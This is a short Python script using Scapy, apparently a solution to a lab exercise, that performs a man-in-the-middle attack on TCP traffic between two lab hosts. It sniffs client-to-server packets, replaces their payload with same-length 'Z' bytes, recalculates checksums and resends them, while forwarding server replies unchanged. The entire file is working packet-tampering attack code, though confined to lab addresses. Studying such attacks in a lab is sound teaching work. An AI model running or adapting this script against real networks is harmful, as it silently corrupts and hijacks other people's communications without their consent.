#!/usr/bin/env python3
from scapy.all import *

# --- CONFIGURATION ---
# Ensure these IP and MAC addresses match your specific lab setup
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"

IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
# ---------------------

def spoof_pkt(pkt):
    # Client -> Server (Modify the packet)
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B and pkt.haslayer(Raw):

        orig = pkt[Raw].load
        print(f"ORIGINAL ({len(orig)} bytes):", orig)

        # --- THE FIX FOR NETCAT ---
        # Instead of a single byte, we create a byte string of 'Z's
        # that is the exact same length as the original capture.
        newdata = b"Z" * len(orig)
        # --------------------------

        # Create a new IP packet using the bytes from the original
        newpkt = IP(bytes(pkt[IP]))
        
        # Delete checksums and payload info so Scapy recalculates them
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        print(f"SPOOFED ({len(newdata)} bytes):", newdata)
        
        # Send the modified packet
        send(newpkt/newdata, verbose=0)
        return

    # Server -> Client (Forward unchanged)
    # We must forward the ACKs back to the client or the connection drops
    if pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt, verbose=0)
        return

# Sniff for TCP traffic
# Note: Ensure the filter logic matches your network topology so you don't
# capture your own spoofed packets (packet storm).
print("Sniffing and spoofing...")
sniff(iface="br-f55ccea4134c",
      filter=f"tcp and not ether src 02:42:0a:09:00:06 and not ether src 02:42:0a:09:00:05",
      prn=spoof_pkt)